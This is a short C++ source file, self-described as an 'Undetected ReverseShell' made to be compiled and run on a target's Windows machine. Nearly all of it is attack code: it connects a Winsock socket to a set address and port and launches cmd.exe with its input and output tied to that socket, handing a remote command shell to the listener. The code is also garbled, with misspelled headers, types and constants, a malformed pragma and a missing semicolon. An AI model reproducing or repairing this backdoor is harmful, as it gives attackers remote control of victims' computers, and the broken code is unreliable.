// Created By benelhaj_younes (Do0pH2ck)
// Date: 2019/08/22
// Compile And Run On Target's Machine (Windows Machine)
// Undetected ReverseShell Made In C++


#include "stdafx.h"
#include "insock2.h"
#include "stdio.h"

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#pragma comment(lib"ws2_32)

WSDATA wsaData;
SOCKET s1;
struct sockaddr_in hax;
char ip_addr[16];
STARTUPINFO sui;
PROCESS_INFORMATION pi;

int _tmain(int argc, _TCHAR* argv[])
{
  WSAStartup(MAKEWORD(2,2), &wsaData);
  s1 = WSASOCKET(AF_INET, SOCK_STREAN, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

  hax.sin_family = AF_INET;
  hax.sin_port = htons(9110); // Port
  hax.sin_addr.s_addr = inet_addr("127.0.0.1")

  WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
  memset(&sui, 0, sizeof(sui));
  sui.dwFlags = (STARTTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
  sui.hSduInput = sui.hStdOutput = sui.hStdError = (HANDLE) s1;
  sui.cb = sizeof(sui);

  TCHAR commandLine[256] = L"cmd.exe";

  CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
}
